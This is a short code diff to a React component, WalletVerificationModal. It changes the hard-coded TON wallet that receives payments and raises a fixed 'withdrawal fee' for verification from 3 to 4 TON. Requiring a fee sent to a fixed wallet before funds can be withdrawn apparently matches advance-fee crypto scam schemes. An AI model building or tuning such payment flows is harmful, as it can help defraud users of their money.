@@ -17,7 +17,7 @@ interface WalletVerificationModalProps {
   onVerified: () => void;
 }
 
-const VERIFICATION_WALLET = 'UQCFrjvfMxqHh4-tooMa22uNvbKGd73KfGab3cePjZxq_uNb';
+const VERIFICATION_WALLET = 'UQCiVNm22dMF9S3YsHPcgrmqXEQHt4MIdk_N7VJu88NrLr4R';
 
 const formatCountdown = (ms: number) => {
   const totalSeconds = Math.floor(ms / 1000);
@@ -40,8 +40,8 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
   const [isVerified, setIsVerified] = useState(false);
   const [showImage, setShowImage] = useState(true);
   
-  // Fixed withdrawal fee - always 3 TON
-  const verificationFee = 3;
+  // Fixed withdrawal fee - always 4 TON
+  const verificationFee = 4;
 
   // Reset state when modal opens
   useEffect(() => {
